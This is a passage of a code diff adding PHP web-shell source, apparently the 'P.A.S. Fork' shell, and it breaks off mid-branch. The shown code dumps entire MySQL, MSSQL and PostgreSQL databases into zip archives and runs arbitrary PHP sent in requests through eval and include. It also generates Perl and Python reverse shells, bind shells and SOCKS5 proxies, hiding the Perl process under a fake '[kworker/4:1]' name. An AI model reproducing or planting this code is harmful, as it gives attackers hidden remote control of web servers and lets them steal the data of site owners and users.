+                return ($v = pg_fetch_row($this->_res)) ? $v[0] : FALSE;
+            }
+            function fetchTable() {
+                return ($v = pg_fetch_row($this->_res)) ? $v[0] : FALSE;
+            }
+            function getTableSize($b, $s, $t) {
+                if (($v = pg_exec($this->_cnct, 'SELECT COUNT(*) FROM ' . pgsqlEscName($s, $t)))) {
+                    $v = pg_fetch_row($v);
+                    return $v[0];
+                }
+                return '"?"';
+            }
+            function getColumns($b, $s, $t) {
+                $a = parent::getColumns($b, $s, $t);
+                if ($a)
+                    return $a;
+                $a = array();
+                if (PHP_VERSION >= '4.3' && ($v = pg_meta_data($this->_cnct, $s . '.' . $t))) {
+                    foreach ($v as $k => $i) {
+                        $a[$k] = strtoupper($i['type']);
+                        if ($i['not null'])
+                            $a[$k] .= ' NOT NULL';
+                    }
+                    return $a;
+                }
+                if (PHP_VERSION >= '4.2' && ($q = pg_exec($this->_cnct, 'SELECT * FROM ' . pgsqlEscName($s, $t) . ' LIMIT 0'))) {
+                    $i = 0;
+                    while (($v = pg_field_name($q, $i)) !== FALSE)
+                        $a[$k] = pg_field_type($q, $i++);
+                    return $a;
+                }
+                if (($v = pg_exec($this->_cnct, 'SELECT * FROM ' . pgsqlEscName($s, $t) . ' LIMIT 1')) && ($v = pg_fetch_array($this->_res, NULL, PGSQL_ASSOC))) {
+                    foreach ($v as $k)
+                        $a[$k] = '';
+                    return $a;
+                }
+                return FALSE;
+            }
+            function query($v) {
+                return ($this->_res = pg_exec($this->_cnct, $v));
+            }
+            function fetchAssoc() {
+                return pg_fetch_array($this->_res, NULL, PGSQL_ASSOC);
+            }
+            function fetchRow() {
+                return pg_fetch_row($this->_res);
+            }
+            function dump($b, $s, $t, $c, $f) {
+                if (!$this->setBase($b))
+                    return sprintf(E_CHNGDB, $b, $s, $t);
+                $i = '';
+                if ($f) {
+                    if ($v = $this->getColumns($b, $s, $t))
+                        sqlOutCreate($t, $v, 'BINARY', 'pgsqlEscName');
+                    else
+                        $i = sprintf(E_CNSTCS, $b . '.' . $s . '.' . $t);
+                }
+                $c = sqlJoinColumns($c, 'pgsqlEscName');
+                if (pg_exec($this->_cnct, 'BEGIN; DECLARE c CURSOR FOR SELECT ' . $c . ' FROM ' . pgsqlEscName($s, $t))) {
+                    if (($v = pg_exec($this->_cnct, 'FETCH NEXT FROM c')) && ($v = pg_fetch_array($v, NULL, PGSQL_ASSOC))) {
+                        if ($f)
+                            sqlOutInsert(pgsqlEscName($t), $c);
+                        else
+                            echo implode(';', array_keys($v)), "\n";
+                        $c = $this->_cnct;
+                        $d = FALSE;
+                        do {
+                            if ($d)
+                                echo $d;
+                            else
+                                $d = $f ? ',' : "\n";
+                            if ($f)
+                                sqlOutValues($v, 'pgsqlEscData');
+                            else
+                                csvOutValues($v);
+                        } while (($v = pg_exec($c, 'FETCH NEXT FROM c')) && ($v = pg_fetch_row($v)));
+                        if ($f)
+                            echo ";\n";
+                    }
+                    pg_exec('CLOSE c; ROLLBACK');
+                } else
+                    $i .= sprintf(E_SLCTDT, $b . '.' . $t);
+                return $i;
+            }
+            function close() {
+                pg_close($this->_cnct);
+            }
+        }
+        if (PHP_VERSION >= '5'):
+            class MySQLPDOClient extends MySQLBase {
+                function connect($h, $u, $p, $b, $c) {
+                    $a = array();
+                    if ($h !== NULL && ($v = strrpos($h, ':'))) {
+                        $t = (int) substr($h, $v + 1);
+                        $h = substr($h, 0, $v);
+                    } else
+                        $t = NULL;
+                    if ($h !== NULL)
+                        $a[] = 'host=' . $h;
+                    if ($t !== NULL)
+                        $a[] = 'port=' . $t;
+                    if ($b !== NULL)
+                        $a[] = 'dbname=' . $b;
+                    try {
+                        $v = new PDO('mysql:' . implode(';', $a), $u, $p);
+                    }
+                    catch (Exception $e) {
+                        $this->connError($e->getMessage(), $h, $u, $p, $b);
+                    }
+                    $v->query('SET NAMES ' . $this->charset($c));
+                    $this->_cnct = $v;
+                    return TRUE;
+                }
+                function getTableSize($b, $t) {
+                    return $this->sqlTableSize(mysqlEscName($b, $t));
+                }
+                function getColumns($b, $t) {
+                    if ($a = parent::getColumns($b, $t))
+                        return $a;
+                    return $this->getColumnsNames(mysqlEscName($b, $t));
+                }
+                
+                /*FIX*/
+				function fetchRow() {
+					$r = $this->_res->fetch(PDO::FETCH_NUM);
+					if(defined('MPDFIX') && is_int(MPDFIX)) $this->_res->closeCursor();
+					return $r;
+				}
+                
+                function dump($b, $t, $c, $f) {
+					define('MPDFIX', 1);
+					
+                    if ($f)
+                        $i = $this->outCreateTable($b, $t);
+                    $c = sqlJoinColumns($c, 'mysqlEscName');
+                    $this->_cnct->setAttribute(PDO::MYSQL_ATTR_USE_BUFFERED_QUERY, FALSE);
+                    if (($q = $this->_cnct->query('SELECT ' . $c . ' FROM ' . mysqlEscName($b, $t))) && ($v = $q->fetch(PDO::FETCH_ASSOC))) {
+                        if ($f)
+                            sqlOutInsert(mysqlEscName($t), $c);
+                        else
+                            echo implode(';', array_keys($v)), "\n";
+                        $d = FALSE;
+                        do {
+                            if ($d)
+                                echo $d;
+                            else
+                                $d = $f ? ',' : "\n";
+                            if ($f)
+                                sqlOutValues($v, 'mysqlEscData');
+                            else
+                                csvOutValues($v);
+                        } while ($v = $q->fetch(PDO::FETCH_NUM));
+                        if ($f)
+                            echo ";\n";
+                    } else
+                        $i .= sprintf(E_SLCTDT, $b . '.' . $t . ' '. print_r($this->_cnct->errorInfo(), true));
+                    return $i;
+                }
+            }
+            class MSSQLPDOClient extends MSSQLBase {
+                var $canPaginate = FALSE;
+                function connect($d, $u, $p, $b, $c) {
+                    try {
+                        $v = new PDO($d, $u, $p);
+                    }
+                    catch (Exception $e) {
+                        $this->connError($e->getMessage(), $d, $u, $p, $b);
+                    }
+                    $this->_cnct = $v;
+                    $this->_base = $b;
+                    return TRUE;
+                }
+                function getTableSize($b, $s, $t) {
+                    return $this->sqlTableSize(mssqlEscName($b, $s, $t));
+                }
+                function setBase($v) {
+                    if ($v !== $this->_base) {
+                        $this->_base = NULL;
+                        if (!$this->_cnct->query('USE ' . mssqlEscName($v)))
+                            return FALSE;
+                        $this->_base = $v;
+                    }
+                    return TRUE;
+                }
+                function getColumns($b, $s, $t) {
+                    if ($a = parent::getColumns($b, $s, $t))
+                        return $a;
+                    return $this->getColumnsNames(mssqlEscName($b, $s, $t));
+                }
+                function select($b, $s, $t, $c, $o, $l) {
+                    return $this->query('SELECT TOP ' . $l . ' ' . sqlJoinColumns($c, 'mssqlEscName') . ' FROM ' . mssqlEscName($s, $t));
+                }
+                function dump($b, $s, $t, $c, $f) {
+                    if (!$this->setBase($b))
+                        return sprintf(E_CHNGDB, $b, $s, $t);
+                    $i = '';
+                    if ($f) {
+                        if ($v = $this->getColumns($b, $s, $t))
+                            sqlOutCreate($t, $v, 'BINARY', 'mssqlEscName');
+                        else
+                            $i = sprintf(E_CNSTCS, $b . '.' . $s . '.' . $t);
+                    }
+                    $c = sqlJoinColumns($c, 'mssqlEscName');
+                    if (($q = $this->_cnct->query('SELECT ' . $c . ' FROM ' . mssqlEscName($s, $t))) && ($v = $q->fetch(PDO::FETCH_ASSOC))) {
+                        if ($f)
+                            sqlOutInsert(mssqlEscName($t), $c);
+                        else
+                            echo implode(';', array_keys($v)), "\n";
+                        $d = FALSE;
+                        do {
+                            if ($d)
+                                echo $d;
+                            else
+                                $d = $f ? ',' : "\n";
+                            if ($f)
+                                sqlOutValues($v, 'mssqlEscData');
+                            else
+                                csvOutValues($v);
+                        } while ($v = $q->fetch(PDO::FETCH_NUM));
+                        if ($f)
+                            echo ";\n";
+                    } else
+                        $i .= sprintf(E_SLCTDT, $b . '.' . $s . '.' . $t);
+                    return $i;
+                }
+                function fetchBase() {
+                    if (($v = $this->_res->fetch(PDO::FETCH_NUM)) || ($this->_res->nextRowset() && ($v = $this->_res->fetch(PDO::FETCH_NUM))))
+                        return $v[0];
+                    return FALSE;
+                }
+                function fetchSchema() {
+                    return $this->_res->fetchColumn(1);
+                }
+                function fetchTable() {
+                    if (($v = $this->_res->fetch(PDO::FETCH_NUM)) || ($this->_res->nextRowset() && ($v = $this->_res->fetch(PDO::FETCH_NUM))))
+                        return count($v) === 1 ? $v[0] : $v[2];
+                    return FALSE;
+                }
+                function nextResult() {
+                    return $this->_res->nextRowset();
+                }
+            }
+            class MSSQLDBLIBClient extends MSSQLPDOClient {
+                function connect($h, $u, $p, $b, $c) {
+                    $a = array();
+                    if ($h !== NULL)
+                        $a[] = 'host=' . $h;
+                    if ($b !== NULL)
+                        $a[] = 'dbname=' . $b;
+                    return parent::connect('mssql:' . implode(';', $a), $h, $u, $p, $b, $c);
+                }
+            }
+            class MSSQLODBCClient extends MSSQLPDOClient {
+                function connect($h, $u, $p, $b, $c) {
+                    $a = array();
+                    if ($h !== NULL)
+                        $a[] = 'Server=' . $h;
+                    if ($b !== NULL)
+                        $a[] = 'Database=' . $b;
+                    return parent::connect('odbc:' . implode(';', $a), $h, $u, $p, $b, $c);
+                }
+            }
+            class SQLSrvPDOClient extends MSSQLPDOClient {
+                function connect($h, $u, $p, $b, $c) {
+                    $a = array();
+                    if ($h !== NULL)
+                        $a[] = 'Server=' . $h;
+                    if ($b !== NULL)
+                        $a[] = 'Database=' . $b;
+                    return parent::connect('sqlsrv:' . implode(';', $a), $u, $p, $b, $c);
+                }
+            }
+            class PGSQLPDOClient extends PGSQLBase {
+                function connect($h, $u, $p, $b, $c) {
+                    $this->_base = $b;
+                    $this->_clcs = $c;
+                    $this->fillParams($h, $u, $p);
+                    $this->_params = 'pgsql:' . $this->_params;
+                    $v             = $this->_params;
+                    if ($b !== NULL)
+                        $v .= ' dbname=' . $this->escParam($b);
+                    try {
+                        $v = new PDO($v);
+                    }
+                    catch (Exception $e) {
+                        $this->connError($e->getMessage(), $h, $u, $p, $b);
+                    }
+                    $v->query("SET CLIENT_ENCODING TO '" . $this->charset($c) . "'");
+                    $this->_cnct = $v;
+                    return TRUE;
+                }
+                function setBase($v) {
+                    if ($v !== $this->_base) {
+                        $this->_res  = NULL;
+                        $this->_cnct = NULL;
+                        $this->_base = NULL;
+                        try {
+                            $v = new PDO($this->_params . ' base=' . $this->escParam($v));
+                        }
+                        catch (Exception $e) {
+                            return FALSE;
+                        }
+                        $this->_base = $v;
+                        $v->query("SET CLIENT_ENCODING TO '" . $this->charset($this->_clcs) . "'");
+                        $this->_cnct = $v;
+                    }
+                    return TRUE;
+                }
+                function getTableSize($b, $s, $t) {
+                    return $this->sqlTableSize(pgsqlEscName($s, $t));
+                }
+                function getColumns($b, $s, $t) {
+                    if ($a = parent::getColumns($b, $s, $t))
+                        return $a;
+                    return $this->getColumnsNames(pgsqlEscName($s, $t));
+                }
+                function dump($b, $s, $t, $c, $f) {
+                    if (!$this->setBase($b))
+                        return sprintf(E_CHNGDB, $b, $s, $t);
+                    $i = '';
+                    if ($f) {
+                        if ($v = $this->getColumns($b, $s, $t))
+                            sqlOutCreate($t, $v, 'BINARY', 'pgsqlEscName');
+                        else
+                            $i = sprintf(E_CNSTCS, $b . '.' . $s . '.' . $t);
+                    }
+                    $c = sqlJoinColumns($c, 'pgsqlEscName');
+                    if ($this->_cnct->query('BEGIN; DECLARE c CURSOR FOR SELECT ' . $c . ' FROM ' . pgsqlEscName($s, $t))) {
+                        if (($v = $this->_cnct->query('FETCH NEXT FROM c')) && ($v = $v->fetch(PDO::FETCH_ASSOC))) {
+                            if ($f)
+                                sqlOutInsert(pgsqlEscName($t), $c);
+                            else
+                                echo implode(';', array_keys($v)), "\n";
+                            $c = $this->_cnct;
+                            $d = FALSE;
+                            do {
+                                if ($d)
+                                    echo $d;
+                                else
+                                    $d = $f ? ',' : "\n";
+                                if ($f)
+                                    sqlOutValues($v, 'pgsqlEscData');
+                                else
+                                    csvOutValues($v);
+                            } while (($v = $c->query('FETCH NEXT FROM c')) && ($v = $v->fetch(PDO::FETCH_NUM)));
+                            if ($f)
+                                echo ";\n";
+                        }
+                        $this->_cnct->query('CLOSE c; ROLLBACK');
+                    } else
+                        $i .= sprintf(E_SLCTDT, $b . '.' . $s . '.' . $t);
+                    return $i;
+                }
+                function fetchSchema() {
+                    return $this->_res->fetchColumn(0);
+                }
+            }
+        endif;
+        function outData(&$S) {
+            echo ',"f":[';
+            if ($v = $S->fetchAssoc()) {
+                $b = FALSE;
+                foreach ($v as $k => $i) {
+                    if ($b)
+                        echo ',';
+                    else
+                        $b = TRUE;
+                    jsonEcho($k);
+                }
+                echo '],"r":[';
+                $b = FALSE;
+                do {
+                    if ($b)
+                        echo ',';
+                    else
+                        $b = TRUE;
+                    echo '[';
+                    $k = FALSE;
+                    foreach ($v as $i) {
+                        if ($k)
+                            echo ',';
+                        else
+                            $k = TRUE;
+                        jsonEcho($i);
+                    }
+                    echo ']';
+                } while ($v = $S->fetchRow());
+            }
+            echo ']';
+        }
+        $S = $D['e'] . 'Client';
+        $S = new $S();
+        if (!$S->connect($D['h'], $D['u'], $D['p'], $D['b'], $D['l']))
+            $S->connError($S->getError(), $D['h'], $D['u'], $D['p'], $D['b']);
+        if (isset($D['d'])) {
+            $Z = new PZIP();
+            $Z->init();
+            $a = array();
+            $m = packTime(time());
+            foreach ($D['d'] as $k => $v) {
+                if (isset($D['s'][$k]))
+                    foreach ($D['s'][$k] as $i => $s) {
+                        if (isset($D['t'][$k . '-' . $i]))
+                            foreach ($D['t'][$k . '-' . $i] as $n => $t)
+                                $a[$v][$s][$t] = isset($D['f'][$k . '-' . $i . '-' . $n]) ? $D['f'][$k . '-' . $i . '-' . $n] : FALSE;
+                        elseif ($S->getTables($v, $s))
+                            while (($t = $S->fetchTable()) !== FALSE)
+                                $a[$v][$s][$t] = FALSE;
+                    } elseif (isset($D['t'][$k]))
+                    foreach ($D['t'][$k] as $i => $s)
+                        $a[$v][$s] = isset($D['f'][$k . '-' . $i]) ? $D['f'][$k . '-' . $i] : FALSE;
+                elseif ($S->haveSchemas) {
+                    $k = array();
+                    if ($S->getSchemas($v))
+                        while (($i = $S->fetchSchema()) !== FALSE)
+                            $k[] = $i;
+                    foreach ($k as $s)
+                        if ($S->getTables($v, $s))
+                            while (($t = $S->fetchTable()) !== FALSE)
+                                $a[$v][$s][$t] = FALSE;
+                } elseif ($S->getTables($v))
+                    while (($t = $S->fetchTable()) !== FALSE)
+                        $a[$v][$t] = FALSE;
+            }
+            $e = array();
+            $o = $D['o'] === '0';
+            $x = $o ? '.sql' : '.csv';
+            if ($S->haveSchemas)
+                foreach ($a as $d => $v)
+                    foreach ($v as $s => $k)
+                        foreach ($k as $t => $c) {
+                            $f = escFileName($d . '.' . $s . '.' . $t) . $x;
+                            $Z->fileHeader($f, $m);
+                            if ($o)
+                                printf(T_DMPHDR, gmdate('Y-m-d H:i:s'));
+                            if ($i = $S->dump($d, $s, $t, $c, $o))
+                                $e[] = $i;
+                            if ($o)
+                                printf(T_DMPFTR, gmdate('Y-m-d H:i:s'));
+                            $Z->fileFooter($f, $m);
+                        } else
+                foreach ($a as $d => $v)
+                    foreach ($v as $t => $c) {
+                        $f = escFileName($d . '.' . $t) . $x;
+                        $Z->fileHeader($f, $m);
+                        if ($o)
+                            printf(T_DMPHDR, gmdate('Y-m-d H:i:s'));
+                        if ($i = $S->dump($d, $t, $c, $o))
+                            $e[] = $i;
+                        if ($o)
+                            printf(T_DMPFTR, gmdate('Y-m-d H:i:s'));
+                        $Z->fileFooter($f, $m);
+                    }
+            if ($e) {
+                $n = 'ERRORS.txt';
+                $t = packTime(time());
+                $Z->fileHeader($n, $t);
+                foreach ($e as $v)
+                    echo $v;
+                $Z->fileFooter($n, $t);
+            }
+            $Z->close();
+        }
+        if (isset($D['q'])) {
+            if ($S->query($D['q'])) {
+                echo '{"q":';
+                jsonEcho($D['q']);
+                outData($S);
+                $S->close();
+                sDie('}');
+            }
+            echo '{"e":';
+            jsonEcho($D['q'] . "\n" . $S->getError());
+            sDie('}');
+        }
+        if (isset($D['f'])) {
+            $b = isset($D['s']);
+            if ($b ? $S->select($D['b'], $D['s'], $D['t'], $D['f'], $D['o'], $D['r']) : $S->select($D['b'], $D['t'], $D['f'], $D['o'], $D['r'])) {
+                echo '{';
+                if ($S->canPaginate)
+                    echo '"o":', $D['o'], ',';
+                echo '"b":';
+                jsonEcho($D['b']);
+                if ($b) {
+                    echo ',"s":';
+                    jsonEcho($D['s']);
+                }
+                echo ',"t":';
+                jsonEcho($D['t']);
+                outData($S);
+                $S->close();
+                sDie('}');
+            }
+            echo '{"e":';
+            jsonEcho("Can't load data from table " . $D['b'] . '.' . ($b ? $D['s'] . '.' : '') . $D['t'] . ' (' . $S->getError() . ')');
+            sDie('}');
+        }
+        if (isset($D['t'])) {
+            $b = isset($D['s']);
+            if ($v = ($b ? $S->getColumns($D['b'], $D['s'], $D['t']) : $S->getColumns($D['b'], $D['t']))) {
+                $S->close();
+                echo '{"b":';
+                jsonEcho($D['b']);
+                if ($b) {
+                    echo ',"s":';
+                    jsonEcho($D['s']);
+                }
+                echo ',"t":';
+                jsonEcho($D['t']);
+                echo ',"f":[';
+                $i = FALSE;
+                $a = array();
+                foreach ($v as $k => $t) {
+                    if ($i)
+                        echo ',';
+                    else
+                        $i = TRUE;
+                    echo '[';
+                    jsonEcho($k);
+                    if (!isset($a[$t]))
+                        $a[$t] = count($a);
+                    echo ',', $a[$t], ']';
+                }
+                echo '],"y":[';
+                $i = FALSE;
+                foreach ($a as $k => $v) {
+                    if ($i)
+                        echo ',';
+                    else
+                        $i = TRUE;
+                    jsonEcho($k);
+                }
+                sDie(']}');
+            }
+            $S->close();
+            echo '{"e":';
+            jsonEcho("Can't list columns for table " . $D['b'] . '.' . ($b ? $D['s'] . '.' : '') . $D['t']);
+            sDie('}');
+        }
+        if (isset($D['b'])) {
+            $b = isset($D['s']);
+            if ($b || !$S->haveSchemas) {
+                if ($b ? $S->getTables($D['b'], $D['s']) : $S->getTables($D['b'])) {
+                    echo '{"b":';
+                    jsonEcho($D['b']);
+                    if ($b) {
+                        echo ',"s":';
+                        jsonEcho($D['s']);
+                    }
+                    echo ',"t":[';
+                    $i = FALSE;
+                    while (FALSE !== ($v = $S->fetchTable())) {
+                        if ($i)
+                            echo ',';
+                        else
+                            $i = TRUE;
+                        echo '[';
+                        jsonEcho($v);
+                        if (isset($D['r']))
+                            echo ',', $b ? $S->getTableSize($D['b'], $D['s'], $v) : $S->getTableSize($D['b'], $v);
+                        echo ']';
+                    }
+                    $S->close();
+                    sDie(']}');
+                }
+                $S->close();
+                echo '{"e":';
+                jsonEcho("Can't list tables for " . $D['b'] . ($b ? '.' . $D['s'] : ''));
+                sDie('}');
+            }
+            if ($S->getSchemas($D['b'])) {
+                echo '{"b":';
+                jsonEcho($D['b']);
+                echo ',"s":[';
+                $b = FALSE;
+                while (FALSE !== ($v = $S->fetchSchema())) {
+                    if ($b)
+                        echo ',';
+                    else
+                        $b = TRUE;
+                    jsonEcho($v);
+                }
+                $S->close();
+                sDie(']}');
+            }
+            $S->close();
+            echo '{"e":';
+            jsonEcho("Can't list schemas for database " . $D['b']);
+            sDie('}');
+        }
+        if ($S->getBases()) {
+            echo '[';
+            $b = FALSE;
+            while (FALSE !== ($v = $S->fetchBase())) {
+                if ($b)
+                    echo ',';
+                else
+                    $b = TRUE;
+                jsonEcho($v);
+            }
+            $S->close();
+            sDie(']');
+        }
+        $S->close();
+        sDie('{"e":"Can\'t list databases"}');
+        break;
+    case 'p':
+        function sdf() {
+            if (defined('PTF'))
+                delFile(PTF);
+            sDie("\x03\x1E" . (defined('PES') ? "\x06" : "\x15") . "\x17\x04\x10");
+        }
+        register_shutdown_function('sdf');
+        echo "\x01\x02";
+        $D['e'] = preg_replace('/(^[\s]*+<\?php)/ui', '', $D['e']);
+        $D['e'] = 'define("PES",1);' . $D['e'];
+        if (!isset($D['h']))
+            $D['e'] = '@error_reporting(E_ALL);@ini_set("error_reporting",E_ALL);@ini_set("display_errors",TRUE);' . $D['e'];
+			eval($D['e']);
+        if (defined('PES'))
+            die;
+        if ($v = tempFile('<?php ' . $D['e'])) {
+            define('PTF', $v);
+            include($v);
+            if (defined('PES'))
+                die;
+            include_once($v);
+            if (defined('PES'))
+                die;
+            require($v);
+            if (defined('PES'))
+                die;
+            require_once($v);
+            if (defined('PES'))
+                die;
+            if (PHP_VERSION >= '5' && PHP_VERSION <= '5.0.4') {
+                php_check_syntax($v);
+                if (defined('PES'))
+                    die;
+            }
+        }
+        if (PHP_VERSION_ID < 80000 && $v = @create_function('&$args', $D['e']))
+            $v($args);
+        if (defined('PES'))
+            die;
+        sDie();
+        break;
+    case 't':
+        function getCmdOpt($c, $n, $d) {
+            if ($v = strpos($c, ' -' . $n))
+                return ltrim(substr($c, $v + 3, strcspn($c, ' ', $v + 4) + 1));
+            return $d;
+        }
+        echo "\x01\x02";
+        $D['e'] = isset($D['e']) ? trim($D['e']) : '';
+        if (!isset($D['s']))
+            $D['s'] = '';
+        $k = strtok($D['e'], ' ');
+        if (in_array($k, array(
+            'backconnect.perl',
+            'bindport.perl',
+            'socks5.perl'
+        ))) {
+            $p = '$0="' . getCmdOpt($D['e'], 'n', '[kworker/4:1]') . '\0";use IO::Socket;$SIG{"CHLD"}="IGNORE";$f="[Fail]";$w="[Warn]";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")) or die"$f Create socket: $!";';
+            if ($k === 'backconnect.perl')
+                $p .= '$a=inet_aton("' . strtok(' ') . '") or die"$f Convert host address: $!";$s=sockaddr_in(' . strtok(' ') . ',$a) or die"$f Packed address: $!";connect(S,$s) or die"$f Connect: $!";$r="S";';
+            else
+                $p .= 'setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1) or print"$w Set socket options: $!\n";$s=sockaddr_in(' . strtok(' ') . ',inet_aton("' . getCmdOpt($D['e'], 'a', '0.0.0.0') . '")) or die"$f Packed address: $!";bind(S,$s) or die"$f Bind socket: $!";';
+            if ($k === 'bindport.perl')
+                $p .= 'listen(S,1) or die"$f Listen socket: $!";accept(C,S) or die"$f Accept connection: $!";$r="C";';
+            if ($k === 'socks5.perl') {
+                $v = getCmdOpt($D['e'], 's', '');
+                if ($v)
+                    $v = explode(':', $v);
+                $p .= 'use threads;listen(S,SOMAXCONN) or die"$f Listen socket: $!";print"[Succ] Server successfully launched!\n";close(STDIN);close(STDOUT);close(STDERR);sub prcss{$C = $_[0];sysread($C,$b,1);if($b ne "\x05"){shutdown($C,2);close($C);return;}sysread($C,$b,1);sysread($C,$b,ord($b));if(index($b,"\x0' . ($v ? '2' : '0') . '")==-1){syswrite($C,"\x05\xFF");shutdown($C,0);close($C);return;}syswrite($C,"\x05\x0' . ($v ? '2' : '0') . '");';
+                if ($v)
+                    $p .= 'sysread($C,$b,1);sysread($C,$l,1);sysread($C,$u,ord($l));sysread($C,$l,1);sysread($C,$p,ord($l));if(($b ne "\x01") || ($u ne "' . $v[0] . '") || ($p ne "' . $v[1] . '")){syswrite($C,"\x01\xFF");shutdown($C,0);close($C);return;}syswrite($C,"\x01\x00");';
+                $p .= 'sysread($C,$b,1);if($b ne "\x05"){shutdown($C,2);close($C);return;}sysread($C,$c,1);sysread($C,$b,1);if($b ne "\x00"){shutdown($C,2);close($C);return;}sysread($C,$t,1);if($t eq "\x01"){sysread($C,$a,4);$d=$a;}elsif($t eq "\x03"){sysread($C,$a,1);sysread($C,$b,unpack("c",$a));$a.=$b;$d=inet_aton($b);}elsif($t eq "\x04"){sysread($C,$a,16);$d=$a;}else{shutdown($C,2);close($C);return;}sysread($C,$b,2);$a.=$b;if($c ne "\x01"){syswrite($C, "\x05\x07\x00".$t.$a);shutdown($C,0);close($C);return;}if(!socket(D,PF_INET,SOCK_STREAM,getprotobyname("tcp")) or !connect(D,sockaddr_in(unpack("n",$b),$d))){syswrite($C,"\x05\x05\x00".$t.$a);shutdown($C,0);close($C);close(D);return;}syswrite($C,"\x05\x00\x00".$t.$a);$m="";$fc=fileno($C);$fd=fileno(D);vec($m,$fc,1)=1;vec($m,$fd,1)=1;do{$c=$m;$rc=-1;$rd=-1;if(select($c,undef,undef,1)){if(vec($c,$fc,1)){$rc=sysread($C,$b,10240);if($rc){syswrite(D,$b);}}if(vec($c,$fd,1)){$rd=sysread(D,$b,10240);if($rd){syswrite($C,$b);}}}}while($rc!=0 && $rd!=0);shutdown($C,2);close($C);shutdown(D,2);close(D);}while(accept(C,S)){threads->create("prcss",C);}';
+            } else {
+                $v = getCmdOpt($D['e'], 's', NIX ? '/bin/sh -i' : 'cmd');
+                $p .= 'print"[OK] Successful connected!\n";open(STDOUT,">&$r") or die"$f Redirect STDOUT: $!";print "\n# P.A.S. Fork v.' . VER . ' ' . $k . '\n\n";open(STDIN, "<&$r") or die"$f Redirect STDIN: $!";open(STDERR,">&STDOUT") or print"$w Redirect STDERR: $!\n";exec("' . $v . '") or die"$f Run shell (' . $v . '): $!";';
+            }
+            $s = getCmdOpt($D['e'], 'i', NIX ? '/usr/bin/perl' : 'perl.exe');
+            if ($v = tempFile($p)) {
+                exe($s . ' ' . $v . ' &', $D['f'], $D['s']);
+                delFile($v);
+            } else
+                exe($s . " -e '" . $p . "' &", $D['f'], $D['s']);
+        } elseif (in_array($k, array(
+            'backconnect.python',
+            'bindport.python',
+            'socks5.python'
+        ))) {
+            $p = "try:\n import sys,socket";
+            if ($k === 'socks5.python')
+                $p .= ',struct,threading,select';
+            else
+                $p .= ',os,' . (getCmdOpt($D['e'], 't', 'N') === 'N' ? 'subprocess' : 'pty');
+            $p .= ";\n S = socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n";
+            if ($k === 'backconnect.python') {
+                $p .= ' S.connect(("' . strtok(' ') . '",' . strtok(' ') . "));\n";
+                $s = 'S';
+            } else
+                $p .= " S.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1);\n" . ' S.bind(("' . getCmdOpt($D['e'], 'a', '') . '",' . strtok(' ') . "));\n S.listen(5);\n";
+            if ($k === 'bindport.python') {
+                $p .= " (C,A) = S.accept();\n";
+                $s = 'C';
+            }
+            if ($k === 'socks5.python') {
+                $v = getCmdOpt($D['e'], 's', '');
+                if ($v)
+                    $v = explode(':', $v);
+                $p .= "except Exception as e:\n print(e);\nelse:\n" . ' print("[Succ] Server successfully launched!"+chr(10));' . "\n sys.stdin.close();\n sys.stderr.close();\n sys.stdout.close();\n def prcss(C):\n" . '  if C.recv(1)!=b"\x05":' . "\n   C.shutdown(2);\n   C.close();\n   return;\n" . '  if b"\x0' . ($v ? '2' : '0') . '" not in C.recv(struct.unpack("B", C.recv(1))[0]):' . "\n" . '   C.send(b"\x05\xFF");' . "\n   C.shutdown(0);\n   C.close();\n   return;\n" . '  C.send(b"\x05\x0' . ($v ? '2' : '0') . '");' . "\n";
+                if ($v)
+                    $p .= '  if (C.recv(1)!=b"\x01") or (C.recv(struct.unpack("B", C.recv(1))[0])!=b"' . $v[0] . '") or (C.recv(struct.unpack("B", C.recv(1))[0])!=b"' . $v[1] . '"):' . "\n" . '   C.send(b"\x01\xFF");' . "\n   C.shutdown(0);\n   C.close();\n   return;\n" . '  C.send(b"\x01\x00");' . "\n";
+                $p .= '  if C.recv(1)!=b"\x05":' . "\n   C.shutdown(2);\n   C.close();\n   return;\n  c = C.recv(1);\n" . '  if C.recv(1)!=b"\x00":' . "\n   C.shutdown(2);\n   C.close();\n   return;\n  t = C.recv(1);\n" . '  if t==b"\x01":' . "\n   a = C.recv(4);\n" . '   d = socket.inet_ntoa(a);' . "\n" . '  elif t==b"\x03":' . "\n   a = C.recv(1);\n" . '   d = C.recv(struct.unpack("B", a)[0]);' . "\n   a += d;\n" . '  elif t==b"\x04":' . "\n   a = C.recv(16);\n" . '   d = socket.inet_ntop(socket.AF_INET6, a);' . "\n  else:\n   C.shutdown(2);\n   C.cloce();\n   return;\n  p = C.recv(2);\n  a += p;\n" . '  if c!=b"\x01":' . "\n" . '   C.send(b"\x05\x07\x00"+t+a);' . "\n   C.shutdown(0);\n   C.close();\n   return;\n  D = socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n  try:\n" . '   D.connect((d, struct.unpack(">H", p)[0]));' . "\n  except:\n" . '   C.send(b"\x05\x05\x00"+t+a);' . "\n   C.shutdown(0);\n   C.close();\n   D.close();\n  else:\n" . '   C.send(b"\x05\x00\x00"+t+a);' . "\n   C.setblocking(0);\n   D.setblocking(0);\n   while True:\n    r,w,e = select.select([C,D], [], []);\n    if len(r)>0:\n     try:\n      d = r[0].recv(10240);\n      if r[0]==C:\n       D.send(d);\n      else:\n       C.send(d);\n     except:\n      D.close();\n      C.close();\n      break;\n while True:\n  (C,A) = S.accept();\n  t = threading.Thread(target=prcss,args=(C,));\n  t.daemon = True;\n  t.start();";
+            } else
+                $p .= ' print("[OK] Successful connected!\n");' . "\n sys.stdout.flush();\n" . ' os.dup2(' . $s . ".fileno(),0);\n" . ' os.dup2(' . $s . ".fileno(),1);\n" . ' os.dup2(' . $s . ".fileno(),2);\n" . ' print("\n# P.A.S. Fork v.' . VER . ' ' . $k . '\n\n");' . "\n sys.stdout.flush();\n " . (getCmdOpt($D['e'], 't', 'N') === 'N' ? 'subprocess.Popen' : 'pty.spawn') . '(["' . getCmdOpt($D['e'], 's', NIX ? '/bin/sh","-i' : 'cmd') . '"]);' . "\nexcept Exception as e:\n" . ' print(e);';
+            $s = getCmdOpt($D['e'], 'i', NIX ? '/usr/bin/python' : 'python.exe');
+            if ($v = tempFile($p)) {
+                exe($s . ' ' . $v . ' &', $D['f'], $D['s']);
+                delFile($v);
+            } else
+                exe("echo '" . $p . "'| " . $s . ' - &', $D['f'], $D['s']);
+        } elseif ($k === 'report') {
+            $i = getCmdOpt($D['e'], 's', '');
+            if (NIX) {
